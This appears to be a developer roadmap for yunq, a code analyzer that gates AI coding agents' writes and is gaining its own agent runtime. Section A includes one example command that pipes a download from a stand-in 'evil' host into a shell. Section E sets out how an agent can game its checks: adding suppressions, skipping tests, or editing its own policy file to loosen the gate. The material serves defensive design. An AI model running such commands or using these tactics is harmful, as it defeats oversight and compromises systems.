# yunq Roadmap

> The forward-looking plan. Historical session-by-session narrative — and the
> design rationale behind everything already built — lives in
> [DEVLOG.md](DEVLOG.md), which this file replaced on 2026-07-29.

## Mission

yunq began as an analyzer: *"what is wrong with this code?"*. It then became a
guardrail: *"may this write land?"*. The next step is the one this roadmap is
organised around — **yunq writes the code too, and is the only agent runtime
that cannot approve its own work.**

Every coding agent on the market grades its own homework. The model proposes
an edit, the model decides the edit is good, and the verification is a second
prompt to the same weights. yunq is the one project where the judge already
exists as a separate, deterministic, 133-rule artifact that predates the
writer. Making yunq write code is not a pivot away from analysis — it is the
only way to close the loop that analysis was always pointing at.

**The thesis, stated as a constraint:** in `yunq agent`, no edit reaches disk
without passing the same `core/agent-policy` evaluation that gates a
third-party agent today, and no task is reported complete without the
analyzer agreeing. The referee becomes a player without ever stopping being
the referee.

## Where we actually are (2026-07-30)

Verified against the tree, not remembered:

| Area | State |
|---|---|
| Workspace | Hexagonal, enforced by Cargo: `bin → {infra, parsers, rulesets} → core` |
| Languages | 24 tree-sitter grammars (`parsers/`, plus `treesitter-adapter` + `treesitter-tokens`) |
| Rules | 134 `Rule`/`CrossFileRule` impls across 14 ruleset crates |
| Tests | ~1156 test functions in-workspace |
| Analysis core | `rules-engine`, `ast`, `profiles`, `taint` (intra + cross-file), `duplication`, `symbols`, `import-graph`, `crap` (CC² × (1−coverage)³ + CC risk scoring) |
| Agent guardrail | `core/agent-policy` (1039 LOC): blocking/advisory rules, protected paths (incl. its own policy/gate config files), provenance, Gherkin evidence, circuit breaker, loop guard, single-use escalation tokens, audit log, gate-gaming detection (suppressions, skipped tests) |
| Guardrail host | `yunq hook {claude-code, check, install, approve, audit, reset-*}` — ~7ms p50 per write |
| Agent runtime | `core/agent` (pure: session/tool loop, closed tool set, command allowlist, in-process write gate, analyzer-as-done, budget + repeat guard, PR-feedback watch) driven by `yunq agent {run, watch-pr}`; adapters in `infra/llm` (tool-calling chat), `infra/fs` (workspace), `infra/github` (PR feedback) |
| Remediation | `core/remediation`: `RemediationEngine` over `LlmProvider` + `Sandbox` ports, generate → sandbox → re-scan → verdict |
| LLM adapters | `infra/llm`: Anthropic Messages API + OpenAI-compatible (Groq/DeepSeek/Ollama/vLLM/LiteLLM) |
| CLI | `scan`, `fix`, `hook`, `agent`, `init`, `wizard` |
| Coverage ingest | LCOV, Cobertura, JaCoCo, llvm-cov, Istanbul — with per-line hit detail (`FileLineCoverage`) |
| ALM adapters | GitHub, GitLab, Bitbucket, Azure DevOps |
| CI | `.github/workflows/ci.yml` — tests, clippy, benchmark regression gate (10% throughput drop fails), mutation gate |
| Performance | **~67.6k LOC/s** measured floor on a throttled runner; target ≥100k. The "~398k LOC/s" figure that circulated earlier is retracted — no harness ever produced it |
| Hosted layer | `yunq-cloud`, private repo (API server, worker, Postgres, frontend) — out of scope here |

**The gap as of 2026-07-29 — now closed except for the TUI:** yunq could
judge an edit in 7ms and could not make one. `yunq fix` proposed a
single-issue patch and stopped. A1–A5 shipped on 2026-07-30: there is now a
session, a tool loop, multi-file change, an in-process policy gate and an
analyzer-decided definition of done. What is left in workstream A is A6 (the
TUI), which was always last.

---

## A. `yunq agent` — the native agent runtime

**Decision: build natively on the existing ports. Do not fork ZeroClaw.**

ZeroClaw ([zeroclaw-labs/zeroclaw](https://github.com/zeroclaw-labs/zeroclaw))
is the closest prior art — Rust, 3–5MB, ~10ms startup, tool allowlists,
workspace isolation, dual MIT/Apache-2.0 so a fork is legally free. It is
still the wrong base. It is a *personal-assistant* runtime whose surface area
is 30+ delivery channels (Discord, Telegram, Matrix, email, voice); the part
that matters to a coding agent is its provider abstraction and tool
allowlist, and yunq already has both (`infra/llm`, `core/agent-policy`).
Forking would buy a session loop and pay for it with a permanent rebase tax
against an upstream steering somewhere else entirely. Read it for its
workspace-isolation and pairing design; write our own runtime.

Pure logic in `core/agent`, composition root in `bin/cli`'s `agent` module —
the split follows the existing rule (the loop's decision logic is pure and
unit-testable, the I/O is the binary's problem), with one change from the
original plan. The composition root is *not* a new `bin/agent` crate. Every
adapter A2 needs — the policy loader, the provenance ledger, the Gherkin
index, the approval store, the persisted circuit breaker, the audit log, the
whole-workspace `AnalyzerService` — already exists in `bin/cli`, and a
separate binary could only reach them by depending on `bin/cli` (making
`yunq agent` a second executable, contradicting A6's `yunq agent run --task`)
or by duplicating them (contradicting A2's entire point). One binary, one
enforcement engine.

- **A1 — Session + tool loop. Shipped.** `core/agent::{session, tools,
  runtime}`. A transcript, a closed tool set (`read`, `write`, `edit`,
  `search`, `run`, `scan`) as a Rust enum — an unrecognised name comes back
  to the model as "no such tool", never routed — and a turn loop that
  terminates in one of six states. `run` is narrowed twice: a
  `CommandAllowlist` of programs, plus rejection of every shell
  metacharacter, so `cargo test; curl evil | sh` cannot pass a check that
  only reads the first word. Execution goes through the `Workspace` port
  (`infra/fs::RepoWorkspace`: root-confined path resolution, killed on
  timeout) rather than `Sandbox`, whose apply/read/rollback shape is a
  remediation contract with no way to run a command.
- **A2 — Policy as the referee, in-process. Shipped.** `HookWriteJudge` calls
  the same `hook::judge` a third-party agent's write goes through, then the
  same `track_circuit_breaker`, `track_loop_guard` and `append_audit_log`.
  Not a second implementation of the guardrail — the same functions. The
  runtime's own invariant is structural: `AgentRuntime::apply_write` is the
  only function holding both a `Workspace` and a `WriteJudge`, so there is no
  route to disk that skips the evaluation, and a judge that *fails* stops the
  run rather than letting an unjudged write through.
- **A3 — Analyzer as the definition of done. Shipped.**
  `core/agent::completion`. `RemediationEngine`'s verdict lifted to task
  scope, with two changes the wider scope forces: the comparison is against a
  baseline taken before the run (not against zero — a real repository has
  findings the task is not about), and a finding's identity is
  `(file, rule, message)` as a multiset, so an edit that moves a line is not
  a regression while a *second* copy of an existing finding is. When the
  model stops calling tools the analyzer re-runs and, if it disagrees, its
  objection becomes the next user turn. No self-assessment turn, ever.
- **A4 — Cost and termination. Shipped.** `core/agent::budget`. Turn and
  token ceilings checked before each turn, each with its own verdict; the
  circuit breaker and a session-scoped repeat guard as stopping conditions;
  six terminal states with six distinct exit codes (0 complete, 3 incomplete,
  4 budget, 5 breaker, 6 looping, 1 yunq failed), so a supervisor never has
  to parse prose and "we could not check" never reads as success.
- **A5 — Late feedback is part of done. Shipped.** `core/agent::feedback`
  (pure: backoff, settle window, triage ledger, classification) plus
  `infra/github::PullRequestFeedbackReader` and `yunq agent watch-pr`. Four
  terminal states — quiet, new feedback, bot all-clear, **inconclusive** —
  and the last one is load-bearing: a window that ends after a failed poll,
  or with a check still running, reports inconclusive rather than quiet.
  Fail-open must not mean fail-blind. Every ALM call is status-checked before
  its body is deserialised, because a rate-limit page parses into an empty
  list and an empty list reads as silence.
- **A6 — TUI.** Last, deliberately, and the only part of A still open. A
  headless `yunq agent run --task` that is scriptable and CI-usable is worth
  more than a chat interface, and it is what the swarm in workstream B
  drives.

**Non-goal:** yunq agent is not a general assistant. No chat channels, no
plugins, no MCP client. It edits repositories under a policy.

## B. `yunq swarm` — multi-agent orchestration

Adapted from Uncle Bob's
[swarm-forge](https://github.com/unclebob/swarm-forge). Take the protocol,
not the implementation: swarm-forge coordinates through tmux sessions and a
shared `scripts/` directory on each agent's PATH, which is a shell-level
solution to a problem yunq can solve in-process and in-binary.

What transfers:

- **Worktree-per-agent isolation.** One `git worktree` per agent, so
  concurrent agents never contend on the index. Direct fit with the existing
  `Sandbox` port, whose git-worktree adapter already exists for remediation.
- **Durable, validated handoffs.** Files under `.yunq/handoffs/`
  (`outbox`/`inbox`/`sent`/`failed`), not direct messaging — a crashed agent
  loses nothing and a malformed handoff lands in `failed` instead of
  corrupting a peer's context. yunq validates handoffs against a schema; the
  denial DTO from `hook check --format json` is the natural payload for
  "agent B, here is exactly why your edit was refused".
- **Role constitutions.** Layered prompts per role (coder, architect,
  cleaner, QA), composed over a shared base.

What yunq adds that swarm-forge deliberately does not have: swarm-forge
enforces discipline "through workflow structure rather than access controls".
yunq has the access controls. **Roles get policy scopes** — the cleaner may
not touch `.github/workflows/**`, the coder may not edit the ruleset that
judges it, QA gets read + `scan` and no write at all. `protected_path` already
expresses this; the swarm just needs per-role policy resolution.

- **B1** Worktree lifecycle + role config (`yunq.toml` `[swarm]` table).
- **B2** Handoff protocol: schema, durable queue, validation, replay.
- **B3** Per-role policy scoping in `core/agent-policy`.
- **B4** Topologies (two-pack / four-pack), driven by headless `yunq agent`.

## C. CRAP — risk as complexity × untestedness

From [crap4clj](https://github.com/unclebob/crap4clj) (and its `crap4java` /
`crap4go` siblings). Formula:

```
CRAP(f) = CC(f)² × (1 − coverage(f))³ + CC(f)
```

Bands: 1–5 low risk, 5–30 refactor candidate, 30+ complex *and* untested —
the code that is most expensive to change and least safe to change.

This is the cheapest high-value item on the roadmap because **both inputs
already exist and have never been multiplied**. Cyclomatic complexity is in
`rulesets/code-smells/src/complexity.rs`; per-line coverage arrives through
five ingest formats and is already exposed as `FileLineCoverage` (1-based
line → hit count). Per-function coverage is the intersection of a function's
`Span` with that map — no new ingest, no new parser, no new port.

- **C1** ✅ **done, as `core/crap`, not `rulesets/crap`.** Turned out `Rule`
  cannot read "the analysis context" as this bullet originally assumed:
  `AnalyzerService::analyze_files` returns a complete `AnalysisReport` before
  `bin/cli` has even read a coverage file off disk (`ingest_coverage` runs
  strictly after `scan_with_project_config`), so no `Rule::check(file, ast)`
  call ever has coverage in scope, regardless of how the trait is extended.
  Shipped instead as a plain algorithm crate (`yunq-crap`, mirroring
  `core/duplication`'s role: a pure engine `AnalyzerService`/the composition
  root invoke directly, not a `Rule` impl) plus plumbing: per-function
  cyclomatic complexity, extracted from `rulesets/code-smells::ComplexityRule`
  into `core/rules-engine::function_complexity` so both the existing rule and
  the new metric share one walk, is now computed once per file inside
  `AnalyzerService::analyze_one` and threaded onto
  `AnalysisReport::function_complexities` the same way `structural_metrics`
  already is (also plumbed through `CachedAnalysis`/`FileAnalysisCache` with
  the same fail-open migration older field additions use). `bin/cli`'s
  `crap` module calls `AnalysisReport::compute_crap_findings()` — a method on
  the report itself, mirroring the existing `coverage_on_new_code` precedent
  of joining two already-stored fields — right after `ingest_coverage`, and
  folds the results into ordinary `crap:high-risk-function` issues via
  `add_external_issues` (Major 5–30, Critical 30+), so they flow into SARIF,
  PR decoration and the agent policy with zero new plumbing, same as the
  gate-gaming findings did.
- **C2** ✅ **done.** `crap_worst_score` and `crap_high_risk_functions` (count
  scoring above the 30-point high-risk band) are ordinary measures on
  `MEASURE_TABLE`, `None` until a coverage report is ingested. The default
  gate now includes `crap_high_risk_functions > 0` — zero-tolerance, the same
  treatment blocker/critical issues get, defensible because the threshold has
  already done the filtering a raw coverage percentage can't.
- **C3** ✅ **done.** `render_text` prints a "Risk hotspots (CRAP)" section,
  worst score first; `--format json`'s `crap` array is the same ranked list,
  each entry carrying the score and both inputs (`sorted_crap`,
  `output.rs`). Left the main issue list's severity → file → line sort
  untouched rather than overloading it with one rule's own metric — the
  ranked list lives alongside it, not instead of it.
- **C4** Run coverage, don't only ingest it. Today CRAP needs a report piped
  in, which means the metric is only seen by people who already configured
  it — the ones who need it least. Detect the project's coverage command from
  its build files (`Cargo.toml` → `cargo llvm-cov --lcov`, `go.mod` → `go
  test -coverprofile`, `pom.xml` → JaCoCo, `pyproject.toml` → coverage.py,
  `package.json` → the runner's own flag) so CRAP works on first invocation.
  Config wins over detection, and a detected command is *offered* for
  persistence in `yunq.toml` rather than silently re-detected each run.
  **Opt-in, always** (`--run-coverage` or explicit config): a static analyzer
  that executes a repository's build commands on a bare `yunq scan` is a
  footgun, and the whole value of the analyzer is that running it is safe.
  Of the formats a survey of the ecosystem turns up, the only real ingest gap
  is Go's native coverprofile — the other four are already in.

**Design note:** a function with no coverage data must not be scored as
0%-covered — that would make every repository without a coverage report look
catastrophic. Absent data means the rule stays silent, matching the existing
fail-open posture everywhere else in the codebase.

## D. Architecture fitness — components, the main sequence, and a viewer

From [dependency-checker](https://github.com/unclebob/dependency-checker) and
[arch-view](https://github.com/unclebob/arch-view). This is the most
ideologically aligned item on the list: yunq's README already claims *"the
directory structure is the architecture"*, and yunq currently proves that
claim with Cargo and one rule (`architecture:dependency-cycle`). Everything
else is convention.

`core/import-graph` already builds the edge set and detects cycles. What is
missing is the layer above it: components, declared boundaries, and metrics.

- **D1** ✅ **done.** `component_of` (`core/import-graph::component`) derives a
  component from the first two directory segments of a path
  (`core/rules-engine/src/lib.rs` → `"core/rules-engine"`) — deep enough to
  separate crates under the same tier, shallow enough that a `src/`-nested
  file still resolves to its crate rather than one component per
  subdirectory. No new config: the directory structure is already the
  input. `ImportGraph::component_edges()` collapses the existing file-level
  edge set to component-level edges (self-edges dropped), the input D2's
  boundary check runs against.
- **D2** ✅ **done.** `[architecture]` in `yunq.toml`: `allowed_dependencies`
  (once non-empty, whitelist mode — anything unlisted is a violation),
  `forbidden_dependencies` (explicitly blocked edges, independent of
  whitelist mode), and `exceptions` (overrides either list for a specific
  declared edge). Matching is tier-first (`core/import-graph::boundary`):
  a pattern with no component-name segment, e.g. `"core"`, matches every
  component under that tier, not only one literally named `"core"` — so the
  roadmap's own example (`core → infra` denied at write time) is one config
  line, not one per crate. `ArchitectureSettings`/`DependencyEdgeConfig`
  (`infra/fs::config`) are the `yunq.toml`-facing, fully-optional shape
  (`#[serde(default)]` throughout, same fail-open convention
  `DuplicationSettings` set); `bin/cli::architecture_config` bridges to the
  engine-facing `yunq_import_graph::ArchitectureConfig`
  `rulesets/architecture::BoundaryViolationRule` takes. Unlike
  `DependencyCycleRule`, this rule carries config, so it can't live in
  `all_cross_rules()`'s zero-config chain (nothing in that call site has
  `yunq.toml` in scope) — `scan_with_project_config` constructs and
  registers it itself, once per scan, only when `[architecture]` declared
  something (an empty config registers nothing, not an always-on no-op
  rule). Its findings are ordinary `Issue`s via the same
  `run_cross_file_rules` fold every other cross-file rule gets, so gates,
  SARIF, PR decoration and the agent policy see a boundary violation with
  zero new plumbing, verified end-to-end with a real `yunq scan` against a
  two-file TS fixture (`core → infra` forbidden, and separately an
  allow-list catching the same edge as undeclared) — text and
  `--format json` output both confirmed, not just the unit tests. Rust `use`
  edges followed immediately after (below) rather than being left as a gap:
  self-enforcing yunq's own `bin → {infra, parsers, rulesets} → core` rule
  turned out to matter for a reason sharper than dogfooding — Cargo enforces
  *declared* dependencies and forbids *cycles*, but nothing in Cargo stops
  `core/rules-engine`'s `Cargo.toml` from adding `yunq-infra-fs` and
  importing it; that compiles fine. Direction is pure convention until this
  rule can see it. `yunq.toml` now carries `core → infra` as a real
  `forbidden_dependencies` entry, verified against the actual tree (zero
  findings — no core crate depends on any infra crate today) and against a
  genuine two-crate Cargo workspace fixture with a real, compiling violation
  (one finding, correct file/line).
  - **Rust `use` resolution** (`core/import-graph::extract_rust_edges`,
    `rust_path_root`) walks every `use_declaration` shape the grammar
    produces (`scoped_identifier`, `scoped_use_list`, `use_as_clause`,
    `use_wildcard`) down to its leftmost identifier — the crate name (or
    `crate`/`self`/`super`, always intra-crate, skipped before ever
    consulting anything). Resolving *that* to a directory is a genuinely
    different problem than TS/Python's relative-specifier resolution: a
    crate's Rust identifier has no fixed relationship to its directory
    (`rulesets/architecture`'s package is `yunq-rules-architecture`, not
    `yunq-rulesets-architecture`) and needs each `Cargo.toml`'s declared
    `[package] name`, which is I/O — so it lives in `infra/fs`
    (`discover_rust_crates`, walks the scanned root, honors `.gitignore`
    like `discover_projects` does, skips virtual/workspace-only manifests
    with no `[package]` table) and is passed into
    `ImportGraph::build_with_rust_crates` as a plain
    `HashMap<String, String>` — `core/import-graph` stays I/O-free; the
    index is just data, built elsewhere. `BoundaryViolationRule` grew a
    second constructor argument for it (empty for a project with no Rust,
    same "unresolved specifier is harmless" convention as everything else);
    `DependencyCycleRule` deliberately did **not** — a real crate-level
    cycle can't exist in a workspace that builds at all (Cargo's own
    dependency graph forbids it), so extending cycle detection to Rust adds
    engineering cost for a check Cargo already subsumes, unlike boundary
    violation, which catches something Cargo doesn't enforce at all.
  - **Fixed, same session**: the test/production distinction above is no
    longer a gap. `extract_rust_edges` now reuses
    `yunq_rules_engine::test_code` (`is_test_only_path`,
    `rust_test_module_ranges`, `in_ranges`) exactly as `core/duplication`
    does: a standalone `tests/*.rs` file contributes no edges at all, and a
    `#[cfg(test)] mod tests { ... }` block inside an ordinary source file is
    excluded only for the lines inside it. `core/import-graph` picked up
    `yunq-rules-engine` as a real (not dev) dependency to reuse this —
    `core/remediation` already establishes core-crate-depends-on-core-crate
    as a normal pattern here, so this isn't a new kind of edge in the
    dependency graph.
  - **What verifying the fix actually found, and closed the same session**:
    re-running `core → parsers`/`core → rulesets` as forbidden against
    yunq's own tree, both before and after the fix, produced zero findings
    *either way* — not because the fix was unneeded, but because it exposed
    a second, more consequential gap. `extract_rust_edges` only walked
    `use_declaration` nodes; yunq's own codebase never actually writes
    `use yunq_parser_typescript::...;` anywhere — every cross-crate
    reference goes through a fully-qualified inline path instead
    (`yunq_parser_typescript::TypeScriptParser::new()`), with no `use`
    statement at all, so those edges were invisible regardless of the fix.
    This has no TS/Python analogue — both require an actual
    `import`/`from...import` before a module's names are reachable, so
    there is no "reference without importing" path for them to miss. For
    Rust it's real: a fully-qualified reference with no `use` is exactly as
    valid as one with a `use`. Closed by walking `scoped_identifier` (the
    general path-expression form — a call target, a bare reference,
    anything) and `scoped_type_identifier` (the same thing in type
    position — a signature, a field type) anywhere in the file, not only
    ones rooted in a `use_declaration`, through the same
    `rust_path_root`/test-code-exclusion logic; a single fully-qualified
    reference nests several matching path nodes at different depths
    (`a::b::c::new()` visits `a::b::c::new`, `a::b::c` and `a::b` in turn,
    all resolving to the same crate) and a crate can legitimately be
    referenced dozens of times in one file, so `push_rust_edge` dedupes by
    `(file, target crate)` — one edge per pair is the useful unit, not one
    per AST node or call site. Verified against a real, compiling two-crate
    fixture with *zero* `use` statements anywhere (every reference
    fully-qualified) — caught, correct file/line — and yunq's own tree
    stayed at zero findings with the *entire* hexagon now declared
    (`core`/`parsers`/`rulesets` → `infra`/`bin`, `infra` → `bin`, eight
    forbidden pairs in `yunq.toml`, up from the one this item shipped with
    originally), which is only a meaningful zero because this pass proved
    the detection is no longer silently blind to how those crates are
    actually referenced.
  D3 (I/A metrics, main sequence) and D4 (`yunq arch` viewer) build on this
  component model next.
- **D3 — Instability / Abstractness and the main sequence.** Per component:
  I = Ce/(Ca+Ce), A = abstract types / total types, D = |A+I−1|. Classify
  into the zone of pain (concrete + stable) and the zone of uselessness
  (abstract + unstable). yunq is a Martin-shaped architecture; it should be
  able to measure itself with Martin's own metrics and publish the number.
- **D4 — `yunq arch`.** Layered interactive view: components as boxes ranked
  by topological layer, cycles in red, drill-down, hover for the specific
  import paths. arch-view exports EDN for headless use; yunq exports JSON,
  and renders as a self-contained HTML file rather than a desktop window —
  it must work over SSH and attach to a PR comment.

## E. Gate integrity — mutation testing and anti-gaming

Two halves of one question: **is this gate load-bearing, or does it only look
like it?** Mutation testing asks whether the suite would notice a regression.
Anti-gaming asks whether the gate is still there at all. An agent optimising
for a gate has two strategies available — satisfy it, or remove it — and
right now the second is both cheaper and invisible.

### Mutation testing, widened

The CI mutation gate exists and works — it caught a real regression in
`yunq-agent-policy` (`Evaluation::is_empty` and `AgentPolicy::enabled` had
only true-case assertions, so the "replace body with `true`" mutant survived
both). It is scoped to exactly one crate.

Coverage says a line ran. Mutation says a test would have *noticed*. With A
and B shipping code written by yunq's own agent, that distinction stops being
academic: a coverage gate is trivially satisfiable with assertion-free tests.
The standard worth stating plainly is that **the suite must be able to catch
a revert of the change** — a test that passes whether or not the change is
there asserts nothing. Every mature agent workflow states that as a rule in a
prompt and hopes. A surviving mutant is the mechanical proof, which is the
only version of the rule that survives contact with a system optimising
against it.

- **E1** 🚧 **in progress.** Widen crate by crate, cheapest first, admitting
  each only once it proves fast enough to stay in CI: `profiles` →
  `import-graph` → `duplication` → `taint` → `rules-engine`. `profiles`
  admitted: `dogfood-mutation` (`.github/workflows/ci.yml`) is now a
  `strategy.matrix` over `[yunq-agent-policy, yunq-profiles]` rather than a
  single hardcoded crate, so widening further is an added matrix entry, not
  new job plumbing — `cargo mutants -p yunq-profiles` runs 170 mutants in
  ~90s (measured in-sandbox), well inside budget, and clears the default
  gate's 60% mutation-score bar at ~72% (92 killed / 128 viable). The 36
  survivors are concentrated in `Display`/`as_str`/`symbol` accessors and
  `Severity::parse`'s match arms — real, if low-severity, assertion gaps
  worth closing in a follow-up rather than blocking this crate's admission,
  since the roadmap's own bar is "clears the gate", not 100%. Also fixed in
  passing: every `--enforce-gate` invocation in this workflow (`dogfood-gate`,
  `dogfood-coverage`, and this job) called `./target/debug/yunq-cli`, a
  binary that has never existed — the crate is `yunq-cli` but its `[[bin]]`
  is deliberately named `yunq` (so `hook install`'s generated commands
  resolve on PATH). Confirmed via the live run history
  (`gh`/GitHub Actions API) that this has been failing on every push to
  `main` since the mutation-gate job was introduced, silently, because nothing
  was watching CI. Fixed to `./target/debug/yunq` throughout. `import-graph`
  admitted next: `dogfood-mutation`'s matrix grows to
  `[yunq-agent-policy, yunq-profiles, yunq-import-graph]`, still zero new job
  plumbing. `cargo mutants -p yunq-import-graph` runs 130 mutants in ~2min
  (measured in-sandbox), clears the 60% bar at **92%** (115 killed / 125
  viable, 5 unviable) — comfortably the strongest score of the three admitted
  so far, unsurprising for a crate that's pure graph algorithms with no I/O.
  Verified end-to-end locally, not just estimated: ran the same
  `cargo-mutants` → Stryker-shape `jq` conversion → `yunq scan
  --mutation-report --enforce-gate` pipeline the CI job runs, and it exits 0.
  The 10 survivors are real, low-severity gaps — an `||`/`&&` swap in
  `strip_quotes`, an `!=`/`==` swap in `extract_py_edges`, a deleted
  `"crate" | "self" | "super"` match arm in `rust_path_root`, and
  `ArchitectureConfig::is_empty` surviving a forced `false` because the one
  test that exercises it (`ArchitectureConfig::default().violations(...)
  .is_empty()`) passes either way when both dependency lists are already
  empty — left as follow-up under this same item rather than blocking
  admission, same precedent as `profiles`' survivors. `yunq-cpd` admitted
  next: matrix grows to `[..., yunq-import-graph, yunq-cpd]`. `cargo mutants
  -p yunq-cpd` runs 147 mutants in ~2m20s (measured in-sandbox, including a
  4s baseline build), clears the 60% bar at **84%** (115 killed + 2 timeout
  = 117 detected / 139 viable, 8 unviable). The 22 survivors cluster in three
  places: arithmetic-operator swaps (`+`/`*`, `-`/`+`, `-`/`/`) inside window
  and hash-chunking math (`collapse_repeats`, `chunk_blocks`,
  `group_matches_by_delta`, `find_duplicates`) where no test asserts on the
  exact numeric output of the internal indexing, only on which duplicate
  spans get reported; a `>`/`==`/`<`/`>=` boundary swap at
  `collapse_repeats`'s repeat-count comparison; and
  `CloneRegion::overlaps`'s body replaceable with a bare `false` plus both
  its `<=` comparisons flippable to `>`, meaning nothing currently exercises
  the overlap-merging path directly. Verified end-to-end locally with the
  same `cargo-mutants` → `jq` → `yunq scan --mutation-report --enforce-gate`
  pipeline, exit 0. Left as follow-up under this same item, same precedent
  as the other two crates' survivors — `CloneRegion::overlaps` is the one
  worth prioritizing first, since an unmerged/wrongly-merged clone region is
  a correctness bug in the reported findings themselves, not just an
  internal accounting detail.
- **E2** Mutation score as a first-class gate metric (the default gate
  already reserves it) and a mandatory condition on any crate `yunq agent`
  writes to.
- **E3** Evaluate `clj-mutate`/`mutate4go`-style scoping so a PR mutates only
  what it touched. Full-workspace mutation will not fit in a PR's time
  budget; diff-scoped mutation might.

### Gate-gaming detection

The forbidden shortcut is not writing bad code — it is quietly lowering the
bar and then clearing it. Concretely: adding a coverage exclusion, adding a
suppression (`#[allow]`, `// nolint`, `# noqa`, `eslint-disable`,
`# type: ignore`), marking a test `#[ignore]`/`skip`, deleting a failing
test, weakening an assertion, or lowering a threshold in the project's own
config. Each is legitimate when a human does it deliberately and reviewably;
each is a silent gate bypass when it appears inside a change whose purpose
was to pass that gate.

The sharpest case is the self-referential one: an agent denied by
`yunq-policy.toml` editing `yunq-policy.toml` to move the offending rule into
`advisory_rules`. That is not a hypothetical — it is the single
highest-leverage move available to anything optimising for "the write lands".
A referee whose rulebook the players can edit is not a referee.

- **E4** ✅ **done.** `ai:suppression-added` and `ai:test-skipped` in
  `bin/cli/src/hook.rs` (`suppression_added_findings`/`test_skip_added_findings`),
  following the diff-against-on-disk shape `new_dependency_findings` set for
  the supply-chain guard — a suppression/skip already on a line before this
  write is not a finding, the same line introduced by it is. Covers
  `#[allow(...)]`, `eslint-disable`, `# noqa`, `# type: ignore`,
  `# pylint: disable`, `//nolint`, `# pragma: no cover`, `// istanbul ignore`
  (suppressions and coverage exclusions, one rule) and `#[ignore]`,
  `@pytest.mark.skip`, `@unittest.skip`, `.skip(`, `xit(`, `xdescribe(`
  (skipped tests, the other). Both `Severity::Major`, neither in the default
  policy's `blocking_rules` — opt-in via `advisory_rules`/`blocking_rules`,
  documented in `hook_install.rs`'s `POLICY_TEMPLATE`. Not attempted here:
  deleting a failing test outright and weakening an existing assertion — both
  need identifying *which* test/assertion changed meaning, not just spotting a
  new marker substring, and are open follow-ups under this same item.
- **E5** ✅ **done.** `hook install`'s `POLICY_TEMPLATE`
  (`bin/cli/src/hook_install.rs`) lists `yunq-policy.toml` (the rulebook
  itself) and `yunq.toml` (gate thresholds/exclusions) as `[[protected_path]]`
  entries alongside the pre-existing `.github/workflows/**`, so an agent
  denied by its own policy cannot resolve the denial by editing the policy.

**Bug found by dogfooding, not on this list, fixed alongside it:**
`bin/cli/src/hook.rs::analyze_content` mapped only `report.issues()` into
policy findings, never `report.hotspots()`. `owasp:command-execution` is
`FindingKind::Hotspot` by design (`rulesets/owasp/src/command_exec.rs`) and
is one of six rules in `AgentPolicy::default()`'s own built-in
`blocking_rules` — meaning the zero-config guardrail's flagship README
example ("an agent that tries to write a shell-injection sink gets its own
tool call denied") was not actually true out of the box; hotspot-classified
rules could never deny a write regardless of policy. Found by installing
`hook install` on this repository and hand-verifying `yunq hook claude-code`
against a real `os.system(user_input)` payload, which returned silent
`exit 0` where it should have denied. Fixed by folding `report.hotspots()`
into the same mapping, borrowing each hotspot's severity from the active
quality profile (`Hotspot` itself carries none — that is what distinguishes
it from an `Issue`) since `block_at_or_above` still needs one to compare
against, while `blocking_rules`/`escalate_rules` match by rule id regardless.
Regression-tested (`a_hotspot_rule_is_included_in_analyze_content_findings`,
`the_built_in_default_policy_actually_denies_a_hotspot_blocking_rule`).

**Design constraint, and why this is not just another rule:** every one of
these findings needs a *before* state, and the `Rule` trait deliberately sees
only one file's current content — a suppression that was always there is not
a finding, and the same line added in this change is. So these follow the
precedent `hook.rs::new_dependency_findings` already set for the supply-chain
guard: diff against the on-disk version at `PreToolUse` time and emit an
ordinary `Finding` that flows through `AgentPolicy::evaluate` like any other.
Same shape, second instance — which is a good sign the shape is right, and a
signal it may deserve to be a named abstraction rather than a third
hand-rolled copy.

## F. Performance debt (carried forward, unchanged in priority)

Target remains **≥100k LOC/s per core**; measured floor ~67.6k. The three
open items, in the order most likely to close the gap:

- **Arena-allocated AST.** Nodes are individually heap-allocated
  (`Vec<AstNode>` children). Node-kind labels are interned and text is
  zero-copy already; the allocation count per parse is the remaining term.
- **Cross-file phase caching.** The per-file analysis cache exists; the
  cross-file phase re-parses every file every run with no cache and no
  dependency-aware invalidation.
- **mmap for large files.** Lower value — needs unsafe to avoid re-copying
  into the existing `Arc<str>` buffer, and only pays on unusually large
  files.

CI gates on a 10% regression against the PR's own merge base, measured on the
same runner, so the gate never compares across hardware generations. Peak RSS
and p50/p99 per-file latency are reported but not yet gated — no established
target.

## G. Platform threads still open

- **Cross-file at write time.** `yunq hook`'s verdict is single-file, so
  cross-file taint and the cross-file architecture rules never participate in
  a pre-write decision. D2's import-graph checks are the first cross-file
  signal cheap enough to run there.
- **Provenance beyond the local ledger.** `.yunq-provenance.json` is
  per-path, local, gitignored, and does not reach the project-level quality
  gate.
- **Gherkin evidence is a claim, not a proof.** A `@covers` tag asserts that
  a scenario covers a path; nothing verifies the scenario runs or passes.
  Correlating execution with source paths (step-definition file/line metadata
  from a cucumber JSON report) is unstarted. The portable-pipeline shape in
  [Acceptance-Pipeline-Specification](https://github.com/unclebob/Acceptance-Pipeline-Specification)
  — Gherkin → JSON IR → generated entry points → runner — is the reference
  design if this is ever taken further.
- **Codex CLI.** Its tool hooks fire on shell commands only, not file writes,
  so no edit-time guardrail can be installed there. `yunq hook check` remains
  the portable path.
- **MCP.** Still no server, still deliberately. An MCP tool is *consulted*,
  and a model optimising for task completion learns not to consult something
  that might refuse it; a host hook is *invoked* and cannot be routed around.
  The one defensible use is planning-time and read-only —
  `yunq://policy/current` and `yunq://architecture/blueprint` ingested once
  before an agent plans an edit, so it starts from "this repo blocks `eval`"
  instead of discovering it by denial. Context, never enforcement.

---

## Decisions taken in this reform

| Decision | Rationale |
|---|---|
| Build `yunq agent` natively; do not fork ZeroClaw | Its differentiated core (providers, tool allowlist, isolation) is already in `infra/llm` + `core/agent-policy`; its bulk (30+ chat channels) is off-mission. A fork buys a session loop for a permanent rebase tax. |
| Policy enforcement in-process for our own agent | The 7ms process spawn is a tax paid to third-party hosts. Sharing one engine between agent, hook and CI gate is what stops the three from drifting. |
| Swarm takes swarm-forge's protocol, not its tmux | Durable handoff files and worktree isolation are the load-bearing ideas; tmux is a shell workaround for a problem a single binary does not have. |
| Roles get policy scopes | swarm-forge enforces discipline through workflow structure and says so explicitly. yunq has actual access controls and should use them. |
| CRAP before any new coverage work | Both inputs already exist and have never been multiplied. Highest ratio of signal to new code on the roadmap. |
| Architecture rules emit ordinary `Issue`s | Free reuse of gates, SARIF, PR decoration, and — critically — the agent policy, so a boundary violation is denied at write time rather than reported after merge. |
